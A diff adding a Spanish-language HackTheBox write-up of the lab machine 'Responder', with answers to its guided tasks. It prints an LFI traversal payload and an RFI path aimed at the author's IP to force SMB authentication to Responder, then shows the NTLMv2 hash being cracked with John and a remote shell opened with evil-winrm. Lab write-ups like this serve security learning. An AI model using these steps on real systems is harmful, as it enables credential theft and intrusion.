@@ -1,0 +1,235 @@
+---
+titulo: "Responder"
+plataforma: HackTheBox
+dificultad: Muy fácil
+so: Windows
+fecha: 2026-11-09
+tecnicas:
+  - Escaneo de puertos
+  - LFI
+  - RFI
+  - Captura de hashes NTLM
+  - Crackeo de hashes
+  - WinRM
+resumen: "Máquina Windows con una web PHP vulnerable a inclusión de ficheros. Con RFI se fuerza una autenticación contra Responder, se captura el hash NTLMv2 del administrador, se crackea y se entra por WinRM."
+serie:
+  nombre: Starting Point
+  tier: 1
+borrador: false
+---
+
+Máquina del Tier 1 de Starting Point. Las preguntas guiadas (tasks) de HackTheBox aparecen plegadas en la
+sección donde se responden: intenta contestarlas antes de abrirlas.
+
+<Ruta
+  titulo="Camino seguido en Responder, de la conexión a la flag"
+  pasos={[
+    { titulo: 'nmap', detalle: 'Solo 80/tcp: web Apache con PHP' },
+    { titulo: 'page=', detalle: 'El parámetro es vulnerable a LFI y RFI' },
+    { titulo: 'responder', detalle: 'Por RFI, captura el hash NTLMv2 del administrador' },
+    { titulo: 'john', detalle: 'Crackea el hash: la contraseña del administrador' },
+    { titulo: 'evil-winrm', detalle: 'Shell por WinRM (5985); la flag está en el escritorio de mike', meta: true },
+  ]}
+/>
+
+> La IP `10.129.112.2` es la que tenía la máquina en mi sesión; a ti te saldrá otra. Mi máquina atacante
+> (la interfaz `tun0` de la VPN) era la `10.10.15.48`: cuando veas esa IP, pon la tuya.
+
+## Reconocimiento
+
+Lo primero es comprobar que llega la conexión con la máquina:
+
+<Cmd c="ping 10.129.112.2" notas={{ "10.129.112.2": "IP de la máquina objetivo." }} />
+
+Como no lleva `-c`, sigue enviando paquetes hasta que se detiene con `Ctrl+C`, y entonces muestra el resumen:
+
+```text
+64 bytes from 10.129.112.2: icmp_seq=1 ttl=127 time=7.82 ms
+64 bytes from 10.129.112.2: icmp_seq=2 ttl=127 time=7.51 ms
+...
+^C
+--- 10.129.112.2 ping statistics ---
+5 packets transmitted, 5 received, 0% packet loss, time 4007ms
+```
+
+El `ttl=127` ya sugiere que es una máquina Windows (los TTL iniciales típicos son 128 en Windows y 64 en Linux).
+
+Con la conexión comprobada, escaneo todos los puertos y pido la versión de los servicios:
+
+<Cmd c="nmap -p- --min-rate 1000 -sV 10.129.112.2" notas={{ "10.129.112.2": "IP de la máquina objetivo." }} />
+
+```text
+Nmap scan report for unika.htb (10.129.112.2)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
+```
+
+Solo hay un puerto abierto, el **80/tcp**, con un Apache para Windows (`Win64`) que monta **PHP**. Fíjate en
+que nmap ya nombra el host como `unika.htb`: al abrir la web por la IP, el servidor redirige a ese dominio.
+
+<Pista titulo="Tarea 1 · Al visitar el servicio web usando la IP, ¿a qué dominio se nos redirige?">
+  **unika.htb**.
+</Pista>
+
+Para que el navegador resuelva ese nombre, lo añado a mi fichero `/etc/hosts` apuntando a la IP de la máquina:
+
+```text
+10.129.112.2    unika.htb
+```
+
+## Enumeración
+
+Ya puedo abrir `http://unika.htb`. Es una web corporativa de plantilla. Lo interesante aparece al cambiar de
+idioma: el enlace carga la página con un parámetro en la URL.
+
+```text
+http://unika.htb/index.php?page=french.html
+```
+
+El fichero es `index.php` y el idioma se pasa en el parámetro `page`, al que se le da el nombre de un fichero
+HTML (`french.html`). Eso confirma que la web la genera **PHP** y nos deja un parámetro que apunta a ficheros:
+justo el patrón de una inclusión de ficheros.
+
+<Pista titulo="Tarea 2 · ¿Qué lenguaje de scripting se usa en el servidor para generar las páginas?">
+  **php** (lo delata la extensión `.php` del índice y la cabecera `X-Powered-By: PHP/8.1.1`).
+</Pista>
+
+<Pista titulo="Tarea 3 · ¿Cómo se llama el parámetro de la URL que carga las distintas versiones de idioma de la página?">
+  **page**.
+</Pista>
+
+Si el parámetro `page` incluye el fichero sin filtrar la ruta, se pueden explotar dos cosas:
+
+- **LFI** (Local File Inclusion): leer ficheros del propio servidor saliendo del directorio web con `../`. En
+  Windows, un objetivo clásico es el `hosts` del sistema. Por eso un valor como
+  `../../../../../../../../windows/system32/drivers/etc/hosts` sería un ejemplo de LFI.
+- **RFI** (Remote File Inclusion): hacer que el servidor incluya un fichero **remoto** que controlamos
+  nosotros, indicando una URL o una ruta de red. Por eso `//10.10.14.6/somefile` (una ruta de red hacia una
+  máquina atacante) es un ejemplo de RFI.
+
+<Pista titulo="Tarea 4 · ¿Cuál de estos valores de page sería un ejemplo de LFI: «french.html», «//10.10.14.6/somefile», «../../../../../../../../windows/system32/drivers/etc/hosts» o «mimikatz.exe»?">
+  **`../../../../../../../../windows/system32/drivers/etc/hosts`**: sube por el árbol de directorios con `../`
+  para leer un fichero local del sistema.
+</Pista>
+
+<Pista titulo="Tarea 5 · ¿Cuál de esos valores sería un ejemplo de RFI?">
+  **`//10.10.14.6/somefile`**: una ruta de red hacia una máquina remota (en tu caso, la tuya) que hace que el
+  servidor intente cargar un fichero que no es suyo.
+</Pista>
+
+## Acceso inicial
+
+La idea es el RFI, pero no para ejecutar código: cuando un Windows intenta abrir una ruta de red tipo
+`\\mi-ip\algo`, lo hace por **SMB** y, de paso, **se autentica** enviando el hash NTLMv2 del usuario con el
+que corre el servicio. Si en mi máquina monto un servidor SMB falso, capturo ese hash.
+
+Esa es la función de **Responder**: envenena la resolución de nombres de la red y levanta servidores de
+autenticación falsos (SMB, HTTP…). Lo arranco en la interfaz de la VPN (`tun0`):
+
+<Cmd c="sudo responder -I tun0" notas={{ "tun0": "Interfaz de la VPN de HTB; es la IP que verá la máquina objetivo." }} />
+
+Con Responder a la escucha, disparo el RFI pidiendo la web con el parámetro `page` apuntando a mi IP:
+
+```text
+http://unika.htb/index.php?page=//10.10.15.48/somefile
+```
+
+La máquina intenta alcanzar ese recurso de red, se autentica contra mi SMB falso y Responder captura el hash:
+
+```text
+[SMB] NTLMv2-SSP Client   : 10.129.112.2
+[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
+[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:7aa1fe582fd6279e:...
+```
+
+Es el hash **NTLMv2** del usuario `Administrator`. NTLM (New Technology LAN Manager) es el conjunto de
+protocolos de autenticación de Microsoft; lo que capturamos no es la contraseña, sino una respuesta de
+reto/respuesta de la que se puede intentar sacar la contraseña por fuerza bruta.
+
+<Pista titulo="Tarea 6 · ¿Qué significan las siglas NTLM?">
+  **New Technology LAN Manager** (respuesta en HTB: `New Technology Lan Manager`).
+</Pista>
+
+<Pista titulo="Tarea 7 · ¿Qué opción usamos en la herramienta Responder para indicar la interfaz de red?">
+  **`-I`** (en mi caso, `-I tun0`).
+</Pista>
+
+Copio el hash completo a un fichero (lo llamo `hash`) y lo crackeo con **John the Ripper**, probando el
+diccionario `rockyou.txt`:
+
+<Cmd c="john -w=/usr/share/wordlists/rockyou.txt hash" notas={{ "/usr/share/wordlists/rockyou.txt": "Diccionario de contraseñas filtradas que trae Kali.", "hash": "Fichero con el hash NTLMv2 capturado." }} />
+
+John detecta solo que es un `netntlmv2` y encuentra la contraseña enseguida:
+
+```text
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+badminton        (Administrator)
+1g 0:00:00:00 DONE ...
+Session completed.
+```
+
+La contraseña del administrador es **`badminton`**.
+
+<Pista titulo="Tarea 8 · Hay herramientas que prueban millones de contraseñas contra un reto/respuesta NetNTLMv2 para ver si alguna genera la misma respuesta. Una se suele llamar «John», pero ¿cuál es su nombre completo?">
+  **John the Ripper** (respuesta en HTB: `John The Ripper`).
+</Pista>
+
+<Pista titulo="Tarea 9 · ¿Cuál es la contraseña del usuario administrator?">
+  **badminton**, la que saca John del hash.
+</Pista>
+
+Con esas credenciales necesito un servicio para entrar. Un escaneo con scripts y versiones, esta vez sin
+descubrimiento de hosts (`-Pn`), descubre un segundo puerto que el primer escaneo no mostró:
+
+<Cmd c="nmap -sVC -T4 -Pn -p- 10.129.112.2" notas={{ "10.129.112.2": "IP de la máquina objetivo." }} />
+
+```text
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
+5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+```
+
+El **5985/tcp** es el puerto de **WinRM** (Windows Remote Management), el servicio con el que se administra
+Windows en remoto por HTTP.
+
+<Pista titulo="Tarea 10 · Usaremos un servicio de Windows para acceder en remoto a la máquina con la contraseña recuperada. ¿En qué puerto TCP escucha?">
+  **5985** (WinRM sobre HTTP).
+</Pista>
+
+Me conecto con **evil-winrm**, que abre una consola de PowerShell remota con esas credenciales:
+
+<Cmd c="evil-winrm -i 10.129.112.2 -u administrator -p badminton" notas={{ "10.129.112.2": "IP de la máquina objetivo.", "administrator": "Usuario cuyo hash capturamos.", "badminton": "Contraseña que sacó John." }} />
+
+Entro como `administrator`. La flag de la máquina está en el escritorio del usuario **mike**
+(`C:\Users\mike\Desktop\flag.txt`), que puedo leer por ser administrador. La flag no se publica: la tienes
+que conseguir tú.
+
+<Pista titulo="Tarea 11 · ¿En el escritorio de qué usuario está la flag?">
+  **mike**.
+</Pista>
+
+<Pista titulo="Flag · Envía la flag del escritorio de mike">
+  Está en `flag.txt`, dentro de `C:\Users\mike\Desktop`. Como entras por WinRM como `administrator`, puedes
+  leerla con `type C:\Users\mike\Desktop\flag.txt`.
+</Pista>
+
+## Escalada de privilegios
+
+No hace falta: el hash que capturamos y crackeamos es el del usuario **administrator**, así que el acceso por
+WinRM ya es con el usuario de más privilegios de la máquina.
+
+## Lecciones aprendidas
+
+- **Qué fallé:** desde Pwnbox no me funcionaba. Al disparar el RFI contra mi IP, Responder no recibía nada, y
+  además la web ni siquiera cargaba bien. Lo resolví pasándome a mi máquina virtual de Kali por la VPN, y
+  ahí el problema de que la web no respondía se arregló bajando la MTU de la interfaz `tun0` a 1200
+  (`sudo ip link set dev tun0 mtu 1200`): con la MTU por defecto, las respuestas grandes se perdían.
+- **Lo que enseña la máquina:** un parámetro que incluye ficheros sin filtrar no solo sirve para leer
+  ficheros locales (LFI); apuntándolo a una ruta de red propia (RFI) se fuerza a Windows a autenticarse
+  contra ti, y de esa autenticación sale un hash NTLMv2 crackeable. La web era una puerta a credenciales,
+  no solo a datos.
+- **Qué haré la próxima vez:** ante un parámetro tipo `page=`, probar tanto LFI como RFI, y si el objetivo es
+  Windows, tener Responder a la escucha antes de disparar la petición. Y si una herramienta de red "no
+  responde" desde la VPN, sospechar de la MTU antes que de la propia herramienta.
